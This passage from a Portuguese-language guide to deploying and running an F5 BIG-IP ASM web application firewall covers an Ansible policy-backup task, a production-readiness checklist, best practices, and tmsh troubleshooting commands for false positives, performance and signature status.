    - name: Exportar policy para backup
      f5networks.f5_modules.bigip_asm_policy_fetch:
        provider: "{{ provider }}"
        name: "policy_api_pagamento"
        dest: "/var/tmp/backups/"
        file: "policy_api_pagamento_{{ ansible_date_time.date }}.xml"
```

---

## Boas Práticas e Checklist de Produção

### Checklist de Implementação WAF

```
ANTES DE COLOCAR EM PRODUÇÃO:

Preparação:
[ ] Licença ASM/AWAF verificada e ativa
[ ] Módulo ASM provisionado
[ ] Perfil HTTP configurado no Virtual Server
[ ] SSL Offloading funcionando (WAF precisa ver tráfego descriptografado)

Configuração da Policy:
[ ] Template adequado escolhido (Rapid Deployment para começar)
[ ] Modo TRANSPARENT ativado (NUNCA comece em blocking)
[ ] Application Language definida (utf-8)
[ ] Server Technologies configuradas (Apache, Tomcat, PHP, Node.js, etc.)
[ ] Allowed File Types revisados
[ ] Data Guard habilitado para dados sensíveis (CPF, cartão)
[ ] Signature Staging habilitado (7-14 dias)

Logging:
[ ] Logging Profile criado e associado ao VS
[ ] Logs sendo enviados para SIEM (Splunk/ELK)
[ ] Retenção de logs definida
[ ] Alertas configurados para eventos críticos

Tuning (mínimo 2-4 semanas):
[ ] Falsos positivos identificados e tratados
[ ] Learning suggestions revisadas
[ ] Exceções criadas onde necessário
[ ] Assinaturas problemáticas desabilitadas por URL/parâmetro
[ ] Testes de regressão realizados

Ativação:
[ ] Modo BLOCKING ativado gradualmente
[ ] Página de bloqueio customizada
[ ] Equipe de NOC treinada para interpretar Support IDs
[ ] Procedimento de rollback documentado (voltar para transparent)
[ ] Monitoramento ativo dos logs pós-blocking

Manutenção:
[ ] Atualização regular de assinaturas (mensal)
[ ] Revisão periódica de falsos positivos
[ ] Backup regular das policies
[ ] Teste de penetração anual
```

### Boas Práticas

| Prática | Descrição |
|---------|-----------|
| **Sempre comece em Transparent** | Nunca coloque WAF em blocking sem período de observação |
| **Habilite Signature Staging** | Novas assinaturas devem ficar em staging antes de enforced |
| **Use Server Technologies** | Informe ao WAF quais tecnologias seu backend usa para assinaturas mais precisas |
| **Customize a blocking page** | A página padrão é genérica. Inclua Support ID para facilitar troubleshooting |
| **Monitore os logs diariamente** | Especialmente nas primeiras semanas após ativar blocking |
| **Automatize backups** | Exporte policies regularmente via API ou Ansible |
| **Documente exceções** | Cada exceção deve ter justificativa documentada |
| **Teste com scanners** | Use OWASP ZAP ou Burp Suite para validar proteção |
| **Mantenha assinaturas atualizadas** | Novas vulnerabilidades surgem constantemente |
| **Separe policies por aplicação** | Cada aplicação deve ter sua própria policy |

---

## Troubleshooting WAF

### Problema 1: Aplicação parou de funcionar após ativar WAF

**Diagnóstico:**
```bash
# 1. Verificar se é o WAF bloqueando
# Procure o Support ID na página de erro e pesquise nos logs
tmsh show security log profile | grep -A 5 "support-id"

# 2. Via GUI: Security > Event Logs > Application > Requests
# Filtrar por Support ID

# 3. Solução rápida: voltar para Transparent
tmsh modify asm policy /Common/policy_app_ecommerce enforcement-mode transparent
tmsh modify asm policy /Common/policy_app_ecommerce apply
```

### Problema 2: Performance degradada após ativar WAF

**Diagnóstico:**
```bash
# Verificar uso de CPU do ASM
tmsh show sys performance asm

# Verificar latência adicionada
tmsh show ltm virtual vs_app_producao stats | grep "avg"

# Verificar se há muitas assinaturas habilitadas desnecessariamente
tmsh list asm policy /Common/policy_app_ecommerce attack-signatures { filter-by-state enabled } | wc -l
```

**Soluções:**
- Desabilitar assinaturas não relevantes para sua stack
- Configurar Server Technologies para filtrar assinaturas por tecnologia
- Verificar se há iRules conflitando com ASM
- Considerar hardware upgrade se o volume de tráfego for muito alto

### Problema 3: Assinaturas não detectam ataque conhecido

**Diagnóstico:**
```bash
# Verificar se assinatura existe
tmsh list asm policy /Common/policy_app_ecommerce attack-signatures | grep -i "sql injection"

# Verificar se está em staging ou enforced
tmsh list asm policy /Common/policy_app_ecommerce attack-signatures { filter-by-state staging }

# Verificar se está habilitada
tmsh list asm policy /Common/policy_app_ecommerce attack-signatures { filter-by-state disabled }

# Verificar versão das assinaturas
tmsh show asm signature-status
```

**Soluções:**
- Atualizar banco de assinaturas: `tmsh modify asm signature-update check-for-updates`
- Mover assinatura de staging para enforced
- Verificar se há exceção/whitelist conflitante

### Problema 4: Bloqueando uploads legítimos

**Causa:** WAF pode interpretar conteúdo de arquivos enviados como ataque.

**Solução:**
```bash
# Desabilitar inspeção de conteúdo para URL de upload
# Via GUI: Security > Application Security > URLs > /api/upload
# Desmarcar: "Perform file type checking on file uploads"
# OU: Desabilitar assinaturas específicas para a URL de upload
```

### Comandos Úteis de Troubleshooting

```bash
# Verificar se ASM está processando tráfego
tmsh show sys performance asm

# Ver eventos em tempo real
tail -f /var/log/asm

# Verificar status da policy
tmsh list asm policy /Common/policy_app_ecommerce enforcement-mode

# Contar violações por tipo
tmsh show asm policy /Common/policy_app_ecommerce requests-num-violations

# Verificar learning suggestions pendentes
tmsh show asm policy /Common/policy_app_ecommerce learning-suggestions

# Recarregar assinaturas
tmsh modify asm signature-update check-for-updates

# Verificar espaço de log
du -sh /var/log/asm*
```

---

## Referências

- [F5 ASM Official Documentation](https://techdocs.f5.com/en-us/bigip-15-1-0/big-ip-asm-getting-started.html)
- [F5 iControl REST API Reference](https://clouddocs.f5.com/api/icontrol-rest/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [F5 DevCentral](https://community.f5.com/)
- [F5 Ansible Collection](https://galaxy.ansible.com/f5networks/f5_modules)
- [F5 CloudDocs](https://clouddocs.f5.com/)

---

*Documento criado para fins educacionais. Sempre teste em ambiente de homologação antes de aplicar em produção.*
